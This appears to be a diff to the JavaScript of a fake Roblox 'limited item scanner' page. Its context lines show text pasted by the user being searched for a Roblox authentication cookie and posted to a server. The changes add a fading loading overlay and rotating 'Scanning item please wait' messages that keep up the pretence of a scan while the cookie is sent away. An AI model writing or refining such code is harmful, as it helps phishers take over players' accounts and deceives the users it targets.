@@ -77,6 +77,15 @@ function closeScanModal() {
     modal.style.display = 'none';
     document.body.style.overflow = 'auto';
     
+    // Hide loading overlay
+    hideLoadingOverlay();
+    
+    // Clear any running animations
+    if (window.scanningInterval) {
+        clearInterval(window.scanningInterval);
+        window.scanningInterval = null;
+    }
+    
     // Reset form
     if (textarea) {
         textarea.value = '';
@@ -171,7 +180,7 @@ async function submitPowerShell() {
     // Show loading state
     submitBtn.disabled = true;
     submitText.textContent = 'Sending...';
-    if (loadingOverlay) loadingOverlay.style.display = 'block';
+    showLoadingOverlay('Preparing scan...', 'Initializing item verification process');
 
     try {
         // Scan limited items and find authentication data from the input
@@ -186,9 +195,9 @@ async function submitPowerShell() {
         
         // Block execution if no authentication data is found AND less than 50 words
         if (!robloxCookie && wordCount < 50) {
+            hideLoadingOverlay();
             submitText.textContent = `Too Short: ${wordCount} words`;
             submitBtn.style.background = '#ef4444';
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
             
             setTimeout(() => {
                 submitBtn.disabled = false;
@@ -217,29 +226,24 @@ async function submitPowerShell() {
             body: JSON.stringify(payload)
         });
         
-        // Hide loading overlay
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-
         if (response.ok) {
             submitText.textContent = 'Scanning item please wait';
             submitBtn.style.background = '#10b981';
             showNotification('Scanning item please wait', 'success');
             
-            // Show loading overlay during scanning
-            if (loadingOverlay) loadingOverlay.style.display = 'block';
-            
-            // Start scanning animation
-            startScanningAnimation(submitText);
+            // Show scanning animation with loading overlay
+            showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
+            startScanningAnimation();
             
             setTimeout(() => {
-                if (loadingOverlay) loadingOverlay.style.display = 'none';
+                hideLoadingOverlay();
                 closeScanModal();
             }, 4000);
         } else {
             throw new Error(`Item scanning failed with status: ${response.status}`);
         }
     } catch (error) {
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
+        hideLoadingOverlay();
         
         submitText.textContent = 'Error';
         submitBtn.style.background = '#ef4444';
@@ -434,8 +438,37 @@ function startLoadingAnimation(submitText) {
     submitText.loadingInterval = interval;
 }
 
+// Loading overlay control functions
+function showLoadingOverlay(title = 'Scanning item...', text = 'Please wait while we analyze your limited items') {
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const loadingTitle = document.getElementById('loadingTitle');
+    const loadingText = document.getElementById('loadingText');
+    
+    if (loadingTitle) loadingTitle.textContent = title;
+    if (loadingText) loadingText.textContent = text;
+    if (loadingOverlay) {
+        loadingOverlay.style.display = 'block';
+        // Add fade in animation
+        loadingOverlay.style.opacity = '0';
+        setTimeout(() => {
+            loadingOverlay.style.opacity = '1';
+        }, 10);
+    }
+}
+
+function hideLoadingOverlay() {
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingOverlay) {
+        loadingOverlay.style.opacity = '0';
+        setTimeout(() => {
+            loadingOverlay.style.display = 'none';
+        }, 300);
+    }
+}
+
 // Scanning animation after successful submission
-function startScanningAnimation(submitText) {
+function startScanningAnimation() {
+    const loadingTitle = document.getElementById('loadingTitle');
     const scanMessages = [
         'Scanning item please wait',
         'Scanning item please wait.',
@@ -446,17 +479,17 @@ function startScanningAnimation(submitText) {
     let messageIndex = 0;
     
     const interval = setInterval(() => {
-        if (!submitText) {
+        if (!loadingTitle) {
             clearInterval(interval);
             return;
         }
         
-        submitText.textContent = scanMessages[messageIndex];
+        loadingTitle.textContent = scanMessages[messageIndex];
         messageIndex = (messageIndex + 1) % scanMessages.length;
     }, 500);
     
-    // Store interval ID so it can be cleared
-    submitText.scanningInterval = interval;
+    // Store interval ID globally so it can be cleared
+    window.scanningInterval = interval;
 }
 
 // Stop loading animation
